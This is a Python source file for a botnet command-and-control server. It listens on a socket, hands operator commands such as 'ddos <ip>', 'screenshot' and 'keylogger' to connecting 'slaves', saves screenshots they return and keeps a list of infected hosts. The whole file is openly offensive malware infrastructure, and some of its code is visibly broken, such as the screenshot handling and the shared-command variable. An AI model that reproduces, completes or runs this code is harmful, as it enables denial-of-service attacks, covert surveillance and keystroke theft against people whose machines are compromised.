from signal import SIGTERM
import socket
import ipaddress
from multiprocessing import Lock, Process, Manager
from PIL import Image
import os

# COMMAND AND CONTROL CODE WILL GO HERE

port = 1234
ip = '127.0.0.1'

def runServer(sharedArray, slaves):
    #Create listening socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', port))
        print("Bound to " + ip + ":" + str(port))
        s.listen()
        print("Listening")
        while True:
                #Accept connections and send task back
                sres, addr = s.accept()
                data = sres.recv(1024)
                print(addr[0])
                print("Received a message from " + str(addr) + ":\n"
                       + str(data))
                command = bytearray(sharedArray)
                sres.sendall(command)
                if(command.decode('utf-8').split(" ")[0] == "screenshot"):
                    byteforimage = sres.recv(40960000)
                    image = Image.open(byteforimage)
                    image.save("./screenshot.png")
                sres.close()
                #Keep list of online slaves
                if slaves.count(addr[0]) == 0:
                    slaves.append(addr[0])
                    
#Checks if an ip address is valid 
def isValidIp(address):
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        return False

if __name__ == "__main__":
    #Manager is used to share data between processes
    manager = Manager()
    sharedArray = manager.list()
    sharedArray[:] = b""
    
    slaves = manager.list()
    
    #Run server in seperate process
    p = Process(target=runServer, args=(sharedArray, slaves))
    p.start()
    while True:
        #Wait for command input
        print("Enter a command...")
        command = input().strip()
        currentSplit = command.split(" ")
        #Process command
        if currentSplit[0] == "exit":
            print("Stopping server...")
            break
        elif currentSplit[0] == "ddos":
            if len(currentSplit) < 2 or not isValidIp(currentSplit[1]):
                print("Invalid argument, should give valid ip address")
                sharedArray.value = b""
            else:
                #Convert to bytes for sending to slave
                sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "screenshot":
            sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "keylogger":
            sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "slaves":
            #Print all active slaves
            message = "\033[4mCURRENT SLAVES:\033[0m"
            for slave in slaves:
                message += "\n" + str(slave)
            print(message)
        else:
            print("Unvalid command")
    os.kill(p.pid, SIGTERM)